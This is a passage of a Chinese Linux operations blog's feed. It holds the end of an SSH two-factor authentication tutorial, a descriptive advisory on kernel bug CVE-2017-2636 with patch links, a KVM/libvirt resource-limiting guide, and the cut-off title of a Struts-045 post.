<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">sed -i &apos;s/ChallengeResponseAuthentication no/ChallengeResponseAuthentication yes/g&apos; /etc/ssh/sshd_config</div></pre></td></tr></table></figure>
<ul>
<li>重启sshd服务</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">systemctl restart sshd.service</div></pre></td></tr></table></figure>
<h2 id="测试登陆"><a href="#测试登陆" class="headerlink" title="测试登陆"></a>测试登陆</h2><p>以上配置完成基本上就搞定了，下面我们进行测试。</p>
<h3 id="登陆测试"><a href="#登陆测试" class="headerlink" title="登陆测试"></a>登陆测试</h3><ul>
<li>输入命令登陆主机</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">ssh root@10.112.2.3</div></pre></td></tr></table></figure>
<ul>
<li>首先输入服务器的密码,接着会让输入运维密码。</li>
</ul>
<p>运维密码可在小程序中查看。</p>
<p> <img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/onetime.jpg" alt=""></p>
<p>如下图：</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/logintest.png" alt=""></p>
<p>我们可以看到，在登陆的时候，需要配合“运维密码”才能登陆服务器。</p>
<ul>
<li>公钥登陆测试</li>
</ul>
<p>如果使用公钥登陆呢？以上配置是不是也是需要配合运维密码才能登陆的，我们进行验证：</p>
<ul>
<li>首先，我们将本机的公钥复制到远程机器的authorized_keys文件中。 </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">ssh-copy-id root@10.112.2.3</div></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/ssh-copy-id.png" alt=""></p>
<ul>
<li>登陆测试</li>
</ul>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/logintest.png" alt=""></p>
<p>我们可以看到，不需要输入任何密码，直接登陆到了系统。</p>
<h3 id="结合运维密码配置增强型SSH安全选项"><a href="#结合运维密码配置增强型SSH安全选项" class="headerlink" title="结合运维密码配置增强型SSH安全选项"></a>结合运维密码配置增强型SSH安全选项</h3><p>针对上面公钥登陆的测试，如果还任我不是很安全，我们可以设定如下登陆场景：公钥+密码+运维密码，我们需要如何做呢？</p>
<ul>
<li>配置SSH公钥双因子</li>
</ul>
<p>修改/etc/ssh/sshd_config配置文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">echo &quot;AuthenticationMethods publickey,keyboard-interactive:pam&quot; &gt;&gt;/etc/ssh/sshd_config</div></pre></td></tr></table></figure>
<ul>
<li>重启SSH服务</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">systemctl restart sshd.service</div></pre></td></tr></table></figure>
<ul>
<li>登陆测试</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">ssh root@10.112.2.3</div></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/pamssh.png" alt=""></p>
<p>可以看到，登陆的时候是需要验证公钥，密码，及输入运维密码才能登陆到系统。</p>
<ul>
<li><p>没有密钥的情况下尝试登陆测试,如下图</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/nopublickey.png" alt=""></p>
</li>
</ul>
<p>至此，本文结束，如有错误及不足欢迎指正。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;通过运维密码实现Linux系统SSH双因子认证&quot;&gt;&lt;a href=&quot;#通过运维密码实现Linux系统SSH双因子认证&quot; class=&quot;headerlink&quot; title=&quot;通过运维密码实现Linux系统SSH双因子认证&quot;&gt;&lt;/a&gt;通过运维密码实现Linux系统SS
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
      <category term="安全" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="双因子认证" scheme="http://blog.unixmen.cn/tags/%E5%8F%8C%E5%9B%A0%E5%AD%90%E8%AE%A4%E8%AF%81/"/>
    
      <category term="SSH安全加固" scheme="http://blog.unixmen.cn/tags/SSH%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    
      <category term="运维密码" scheme="http://blog.unixmen.cn/tags/%E8%BF%90%E7%BB%B4%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>潜伏7年的Linux内核漏洞CVE-2017-2636 ,可本地提权</title>
    <link href="http://blog.unixmen.cn/2017/03/20/%E6%BD%9C%E4%BC%8F7%E5%B9%B4%E7%9A%84Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9ECVE-2017-2636-%E5%8F%AF%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/"/>
    <id>http://blog.unixmen.cn/2017/03/20/潜伏7年的Linux内核漏洞CVE-2017-2636-可本地提权/</id>
    <published>2017-03-20T02:00:55.000Z</published>
    <updated>2017-03-20T02:55:33.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>漏洞描述</strong><br>又一个古老的Linux内核漏洞被曝光！</p>
<p>漏洞编号：<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-2636" target="_blank" rel="external">CVE-2017-2636</a><br>漏洞发现者：Alexander Popov<br>漏洞危害：高危，(CVSS v3标准漏洞,评分为7.8), 低权限用户利用该漏洞可以在Linux系统上实现本地提权。<br>影响范围：这个bug最早引入在2009年6月22号。在该日期发布后的内核版本均可能受该漏洞影响。详情请参看<br><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=be10eb7589337e5defbe214dae038a53dd21add8" target="_blank" rel="external">https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=be10eb7589337e5defbe214dae038a53dd21add8</a> </p>
<p>漏洞简述：该漏洞是Linux内核驱动 n_hdlc 模块(drivers/tty/n_hdlc.c)发生条件竞争导致的，。</p>
<p>Positive Technologies的研究员Alexander Popov发现了存在于N_HLDC linux内核驱动的竞争条件问题。这个内核驱动负责处理高级数据链路控制（High-Level Data Link Control或简称HDLC）数据。问题导致了double-free漏洞。利用该漏洞可以进行权限提升。该驱动模块提供HDLC串行线路规则，在大多Linux发行版的内核配置为CONFIG_N_HDLC = m，n_hdlc被编译成模块并启用。</p>
<p>Double Free其实就是同一个指针free两次。虽然一般把它叫做double free，其实只要是free一个指向堆内存的指针都有可能产生可以利用的漏洞。</p>
<p>“这是CVE-2017-2636的声明，该漏洞即N_HLDC (drivers/tty/n_hdlc.c) linux内核驱动中的竞争条件。这个漏洞可以用来进行本地提权。”SecList的安全公告提到。“该驱动提供HDLC串行线路规程，这是很多linux发行版中的内核模块——只要是内核设置中有CONFIG_N_HDLC=m的linux发行版。要利用这个漏洞不需要Microgate或者SyncLink硬件。当没有权限的用户打开伪终端并且调用TIOCSETD ioctl函数设置HDLC串行线路规程的时候，模块就会自动加载。”</p>
<p>因此未经授权的攻击者可以利用这个漏洞注入执行任意代码。</p>
<p><strong>影响范围</strong></p>
<p>这个漏洞影响的范围涵盖大多数主流的Linux发行版，包括Red Hat Enterprise Linux 6, 7, Fedora, SUSE, Debian和Ubuntu。</p>
<p>由于漏洞可以追溯至2009年7月，那些Linux设备存在漏洞长达7年了，但是根据Positive Technologies的调查，很难确定漏洞是否已经被利用过。</p>
<p>“漏洞非常老，所以在Linux工作站和服务器中传播广泛。”Popov说道，“要想利用漏洞，攻击者只需要没有权限的普通用户就行了。另外，攻击不需要任何特殊的硬件。”</p>
<p>研究人员在用syzkaller fuzzer进行系统调用测试的时候发现了这个漏洞。syzkaller fuzzer是由Google开发的代码安全审计软件。</p>
<p>Popov于是在2017年2月28日将漏洞细节、exp原型和补丁上报给了kernel.org。Popov称会在之后公布PoC。</p>
<p><strong>修复建议</strong></p>
<p>该漏洞目前已经修复，更新和漏洞详情均在3月7日公布。建议用户尽快下载安全更新。如果暂时无法安装更新，建议手动关闭n_hdlc模块。</p>
<p><strong>Linux各发行版本对于该漏洞相关信息</strong><br>Red Hat Enterprise Linux/CentOS<br><a href="https://access.redhat.com/security/cve/CVE-2017-2636" target="_blank" rel="external">https://access.redhat.com/security/cve/CVE-2017-2636</a></p>
<p>Debian<br><a href="https://security-tracker.debian.org/tracker/CVE-2017-2636" target="_blank" rel="external">https://security-tracker.debian.org/tracker/CVE-2017-2636</a></p>
<p>ubuntu<br><a href="https://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-2636.html" target="_blank" rel="external">https://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-2636.html</a></p>
<p>SUSE/openSUSE<br><a href="https://www.suse.com/security/cve/CVE-2017-2636.html" target="_blank" rel="external">https://www.suse.com/security/cve/CVE-2017-2636.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;漏洞描述&lt;/strong&gt;&lt;br&gt;又一个古老的Linux内核漏洞被曝光！&lt;/p&gt;
&lt;p&gt;漏洞编号：&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-2636&quot; target=&quot;_b
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="漏洞" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="安全" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="struts2" scheme="http://blog.unixmen.cn/tags/struts2/"/>
    
  </entry>
  
  <entry>
    <title>KVM 实例资源限制</title>
    <link href="http://blog.unixmen.cn/2017/03/08/KVM%E5%AE%9E%E4%BE%8B%E8%B5%84%E6%BA%90%E9%99%90%E5%88%B6/"/>
    <id>http://blog.unixmen.cn/2017/03/08/KVM实例资源限制/</id>
    <published>2017-03-08T10:32:46.000Z</published>
    <updated>2017-03-08T10:35:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>KVM生产环境一般情况下都是对KVM环境及内核等进行优化从而达到KVM实例发挥最优性能，但某些特定场景也会对实例进行资源限制。<br>以下分享如何控制实例的资源使用，对实例使用资源进行控制。</p>
<h2 id="一、磁盘资源的控制"><a href="#一、磁盘资源的控制" class="headerlink" title="一、磁盘资源的控制"></a>一、磁盘资源的控制</h2><p>对磁盘的资源限制可使用blkiotune来实现。</p>
<p>使用blkiotune对磁盘进行限制有两种方式：</p>
<ul>
<li>设置实例的权重</li>
<li>限制磁盘的IOPS</li>
</ul>
<p>命令行格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">blkiotune &lt;domain&gt; [--weight &lt;number&gt;] [--device-weights &lt;string&gt;] [--device-read-iops-sec &lt;string&gt;] [--device-write-iops-sec &lt;string&gt;] [--device-read-bytes-sec &lt;string&gt;] [--device-write-bytes-sec &lt;string&gt;] [--config] [--live] [--current]</div></pre></td></tr></table></figure></p>
<p>参数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">--total-bytes-sec &lt;number&gt; total throughput limit in bytes per second</div><div class="line">--read-bytes-sec &lt;number&gt; read throughput limit in bytes per second</div><div class="line">--write-bytes-sec &lt;number&gt; write throughput limit in bytes per second</div><div class="line">--total-iops-sec &lt;number&gt; total I/O operations limit per second</div><div class="line">--read-iops-sec &lt;number&gt; read I/O operations limit per second</div><div class="line">--write-iops-sec &lt;number&gt; write I/O operations limit per second</div><div class="line">--config affect next boot</div><div class="line">--live affect running domain</div><div class="line">--current affect current domain</div></pre></td></tr></table></figure></p>
<h3 id="设置磁盘的权重"><a href="#设置磁盘的权重" class="headerlink" title="设置磁盘的权重"></a>设置磁盘的权重</h3><p>磁盘的权重数值范围在100-1000。</p>
<p>示例：<br>设置虚拟机的权重为700，并立即生效。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">virsh blkiotune 25 --weight 700 --live</div></pre></td></tr></table></figure></p>
<p>实例xml配置为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;blkiotune&gt;</div><div class="line">&lt;weight&gt;700&lt;/weight&gt;</div><div class="line">&lt;/blkiotune&gt;</div></pre></td></tr></table></figure></p>
<h3 id="限制磁盘IOPS"><a href="#限制磁盘IOPS" class="headerlink" title="限制磁盘IOPS"></a>限制磁盘IOPS</h3><p>使用blkdeviotune限制读写速度和IOPS</p>
<p>示例：<br>限制读写（吞吐量）及IOPS<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">virsh blkdeviotune netb2c vda --read-bytes-sec 4096 --write-bytes-sec 2048  --read-iops-sec 15 --write-iops-sec 15 --live</div></pre></td></tr></table></figure></p>
<p>实例xml配置为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;iotune&gt;</div><div class="line">  &lt;read_bytes_sec&gt;4096&lt;/read_bytes_sec&gt;</div><div class="line">  &lt;write_bytes_sec&gt;2048&lt;/write_bytes_sec&gt;</div><div class="line">  &lt;read_iops_sec&gt;15&lt;/read_iops_sec&gt;</div><div class="line">  &lt;write_iops_sec&gt;15&lt;/write_iops_sec&gt;</div><div class="line">&lt;/iotune&gt;</div></pre></td></tr></table></figure>
<h3 id="实测结果"><a href="#实测结果" class="headerlink" title="实测结果"></a>实测结果</h3><p>读写总和（读写速度、IOPS）与读写（读写速度、IOPS）同时只能设置一个</p>
<ul>
<li><p>列举guest块设备列表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">virsh domblklist wpftest</div><div class="line">vda        /home1/wpf/ubuntu-14-04-test.qcow2</div></pre></td></tr></table></figure>
</li>
<li><p>设定guest读/写IOPS</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">virsh blkdeviotune wpftest vda --read-iops-sec 300 --write-iops-sec 300</div></pre></td></tr></table></figure>
</li>
<li><p>获取当前IOPS限制</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">virsh blkdeviotune wpftest vda</div><div class="line">total_bytes_sec: 0</div><div class="line">read_bytes_sec : 0</div><div class="line">write_bytes_sec: 0</div><div class="line">total_iops_sec : 0</div><div class="line">read_iops_sec  : 300</div><div class="line">write_iops_sec : 300</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="二、网卡的资源控制"><a href="#二、网卡的资源控制" class="headerlink" title="二、网卡的资源控制"></a>二、网卡的资源控制</h2><p>网卡的资源限制可在添加网卡是进行限制，以及对已有的网卡进行限制<br>两种资源限制效果上没有区别，可按需选择。</p>
<h3 id="添加网卡时对网卡带宽进行限制"><a href="#添加网卡时对网卡带宽进行限制" class="headerlink" title="添加网卡时对网卡带宽进行限制"></a>添加网卡时对网卡带宽进行限制</h3><p>命令行格式为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">attach-interface &lt;domain&gt; &lt;type&gt; &lt;source&gt; [&lt;target&gt;] [&lt;mac&gt;] [&lt;script&gt;] [&lt;model&gt;] [--persistent] [&lt;inbound&gt;] [&lt;outbound&gt;]</div></pre></td></tr></table></figure></p>
<p>命令行参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[--domain] &lt;string&gt; domain name, id or uuid</div><div class="line">[--type] &lt;string&gt; network interface type</div><div class="line">[--source] &lt;string&gt; source of network interface</div><div class="line">[--target] &lt;string&gt; target network name</div><div class="line">[--mac] &lt;string&gt; MAC address</div><div class="line">[--script] &lt;string&gt; script used to bridge network interface</div><div class="line">[--model] &lt;string&gt; model type</div><div class="line">--persistent persist interface attachment</div><div class="line">[--inbound] &lt;string&gt; control domain&apos;s incoming traffics</div><div class="line">[--outbound] &lt;string&gt; control domain&apos;s outgoing traffics</div></pre></td></tr></table></figure></p>
<h3 id="对已有网卡进行带宽限制"><a href="#对已有网卡进行带宽限制" class="headerlink" title="对已有网卡进行带宽限制"></a>对已有网卡进行带宽限制</h3><ul>
<li><p>命令格式为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">domiftune &lt;domain&gt; &lt;interface&gt; [--inbound &lt;string&gt;] [--outbound &lt;string&gt;] [--config] [--live] [--current]</div></pre></td></tr></table></figure>
</li>
<li><p>参数为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[--domain] &lt;string&gt;  domain name, id or uuid</div><div class="line">[--interface] &lt;string&gt;  interface device (MAC Address)</div><div class="line">--inbound &lt;string&gt;  control domain&apos;s incoming traffics</div><div class="line">--outbound &lt;string&gt;  control domain&apos;s outgoing traffics</div><div class="line">--config         affect next boot</div><div class="line">--live           affect running domain</div><div class="line">--current        affect current domain</div></pre></td></tr></table></figure>
</li>
<li><p>实例xml配置为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;bandwidth&gt;</div><div class="line">&lt;inbound average=&apos;1000&apos; peak=&apos;50&apos; burst=&apos;64&apos;/&gt;</div><div class="line">&lt;outbound average=&apos;1000&apos; peak=&apos;50&apos; burst=&apos;64&apos;/&gt;</div><div class="line">&lt;/bandwidth&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>注：单位kilobytes</p>
<h3 id="实测结果-1"><a href="#实测结果-1" class="headerlink" title="实测结果"></a>实测结果</h3><p>Libvirt实际也是使用TC，因为TC只能限制流出方向流量，不能限制流入方向，所以通过Libvirt限制流量，实际也只能限制流出方向。</p>
<ul>
<li>列举guest网卡列表：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">virsh domiflist netb2c</div><div class="line">Interface  Type       Source     Model       MAC</div><div class="line">-------------------------------------------------------</div><div class="line">vnet44     network    default    rtl8139     52:54:00:4a:61:6a</div></pre></td></tr></table></figure>
<ul>
<li><p>设定带宽限制</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">virsh domiftune wpftest 52:54:00:3b:e2:a5 --inbound 1000 --outbound 1000 --live</div></pre></td></tr></table></figure>
</li>
<li><p>查看当前网卡带宽限制</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">virsh domiftune netb2c vnet44</div><div class="line">inbound.average: 1000</div><div class="line">inbound.peak   : 0</div><div class="line">inbound.burst  : 0</div><div class="line">outbound.average: 1000</div><div class="line">outbound.peak  : 0</div><div class="line">outbound.burst : 0</div></pre></td></tr></table></figure>
</li>
</ul>
<p>注：资源限制过程中，–interface可以是MAC地址也可以是设备名字，生产环境最好使用MAC地址进行限制。</p>
<hr>
<h2 id="三、CPU资源的控制"><a href="#三、CPU资源的控制" class="headerlink" title="三、CPU资源的控制"></a>三、CPU资源的控制</h2><p>对于CPU的资源控制可对实例CPU的权重进行调整，优化可对vcpu与cpu物理核心进行绑定已提升性能及减少宿主机的CPU压力。</p>
<p>命令行格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">schedinfo &lt;domain&gt; [--weight &lt;number&gt;] [--cap &lt;number&gt;] [--current] [--config] [--live] [[--set] &lt;string&gt;]..</div></pre></td></tr></table></figure></p>
<p>参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[--domain] &lt;string&gt;  domain name, id or uuid</div><div class="line">--weight &lt;number&gt;  weight for XEN_CREDIT</div><div class="line">--cap &lt;number&gt;   cap for XEN_CREDIT</div><div class="line">--current        get/set current scheduler info</div><div class="line">--config         get/set value to be used on next boot</div><div class="line">--live           get/set value from running domain</div><div class="line">[--set] &lt;string&gt;  parameter=value</div></pre></td></tr></table></figure></p>
<p>实例xml配置为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;domain&gt;</div><div class="line">&lt;cputune&gt;</div><div class="line">&lt;vcpupin vcpu=&quot;0&quot; cpuset=&quot;1-4,^2&quot;/&gt;</div><div class="line">&lt;vcpupin vcpu=&quot;1&quot; cpuset=&quot;0,1&quot;/&gt;</div><div class="line">&lt;vcpupin vcpu=&quot;2&quot; cpuset=&quot;2,3&quot;/&gt;</div><div class="line">&lt;vcpupin vcpu=&quot;3&quot; cpuset=&quot;0,4&quot;/&gt;</div><div class="line">&lt;emulatorpin cpuset=&quot;1-3&quot;/&gt;</div><div class="line">&lt;shares&gt;2048&lt;/shares&gt;</div><div class="line">&lt;period&gt;1000000&lt;/period&gt;</div><div class="line">&lt;quota&gt;-1&lt;/quota&gt;</div><div class="line">&lt;emulator_period&gt;1000000&lt;/emulator_period&gt;</div><div class="line">&lt;emulator_quota&gt;-1&lt;/emulator_quota&gt;</div><div class="line">&lt;/cputune&gt;</div><div class="line">&lt;/domain&gt;</div></pre></td></tr></table></figure></p>
<p>主要参数说明：<br>shares cpu权重，没有固定的数值，和其他的虚拟机相比较，那个的数值大，那个可以使用的cpu资源就多，比如设置2048值得虚拟机，就比设置1024数值的虚拟机可以多使用2倍的cpu资源。<br>period vcpu强制间隔的时间周期，单位微秒，范围[1000, 1000000]，每一个vcpu不能使用超过period时间周期。<br>quota vcpu最大允许带宽，单位微秒，范围[1000, 18446744073709551]<br>emulator_period 强制间隔的时间周期，单位微妙，范围[1000, 1000000]，虚拟机进程(qemu)不能使用超过period时间周期。<br>emulator_quota 虚拟机进程(qemu)最大允许带宽，单位微妙，范围[1000, 18446744073709551]。</p>
<h3 id="实测结果-2"><a href="#实测结果-2" class="headerlink" title="实测结果"></a>实测结果</h3><p>对vcpu绑定有性能提升的效果，设置权重能控制CPU的资源利用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">virsh schedinfo --set cpu_shares=500 netb2c</div><div class="line">Scheduler      : posix</div><div class="line">cpu_shares     : 500</div></pre></td></tr></table></figure></p>
<h2 id="四、内存资源的控制"><a href="#四、内存资源的控制" class="headerlink" title="四、内存资源的控制"></a>四、内存资源的控制</h2><p>使用memtune可对实例使用内存资源进行控制</p>
<ul>
<li>命令行格式为：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">memtune &lt;domain&gt; [--hard-limit &lt;number&gt;] [--soft-limit &lt;number&gt;] [--swap-hard-limit &lt;number&gt;] [--min-guarantee &lt;number&gt;] [--config] [--live] [--current]</div></pre></td></tr></table></figure>
<ul>
<li>命令行参数：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">[--domain] &lt;string&gt;  domain name, id or uuid</div><div class="line">--hard-limit &lt;number&gt;  Max memory, as scaled integer (default KiB)</div><div class="line">--soft-limit &lt;number&gt;  Memory during contention, as scaled integer (default KiB)</div><div class="line">--swap-hard-limit &lt;number&gt;  Max memory plus swap, as scaled integer (default KiB)</div><div class="line">--min-guarantee &lt;number&gt;  Min guaranteed memory, as scaled integer (default KiB)</div><div class="line">--config         affect next boot</div><div class="line">--live           affect running domain</div><div class="line">--current        affect current domain</div></pre></td></tr></table></figure>
<ul>
<li>实例xml配置为</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;memory unit=&apos;KiB&apos;&gt;2097152&lt;/memory&gt;</div><div class="line">&lt;currentMemory unit=&apos;KiB&apos;&gt;2097152&lt;/currentMemory&gt;</div><div class="line">&lt;memtune&gt;</div><div class="line">&lt;hard_limit unit=&apos;KiB&apos;&gt;4194304&lt;/hard_limit&gt;</div><div class="line">&lt;soft_limit unit=&apos;KiB&apos;&gt;8388608&lt;/soft_limit&gt;</div><div class="line">&lt;min_guarantee unit=&apos;Kib&apos;&gt;1024000&lt;/min_guarantee&gt;&gt;</div><div class="line">&lt;swap_hard_limit unit=&apos;KiB&apos;&gt;4194304&lt;/swap_hard_limit&gt;</div><div class="line">&lt;/memtune&gt;</div></pre></td></tr></table></figure>
<h3 id="实测结果-3"><a href="#实测结果-3" class="headerlink" title="实测结果"></a>实测结果</h3><p>内存可以限制住，但一旦实例内存超限，会导致实例内存溢出从而宕机。</p>
<ul>
<li><p>示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">virsh memtune netb2c --hard-limit 4194304 --soft-limit 8388608 --swap-hard-limit 4194304 --live --config</div></pre></td></tr></table></figure>
</li>
<li><p>查看限制结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">virsh memtune netb2c</div><div class="line">hard_limit     : 4194304</div><div class="line">soft_limit     : 8388608</div><div class="line">swap_hard_limit: 4194304</div></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;KVM生产环境一般情况下都是对KVM环境及内核等进行优化从而达到KVM实例发挥最优性能，但某些特定场景也会对实例进行资源限制。&lt;br&gt;以下分享如何控制实例的资源使用，对实例使用资源进行控制。&lt;/p&gt;
&lt;h2 id=&quot;一、磁盘资源的控制&quot;&gt;&lt;a href=&quot;#一、磁盘资源的控
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
      <category term="虚拟化" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
      <category term="KVM" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/%E8%99%9A%E6%8B%9F%E5%8C%96/KVM/"/>
    
    
      <category term="KVM" scheme="http://blog.unixmen.cn/tags/KVM/"/>
    
      <category term="资源限制" scheme="http://blog.unixmen.cn/tags/%E8%B5%84%E6%BA%90%E9%99%90%E5%88%B6/"/>
    
      <category term="性能优化" scheme="http://blog.unixmen.cn/tags/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Struts-045 漏洞验证</title>
    <link href="http://blog.unixmen.cn/2017/03/07/Struts-045-%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81/"/>
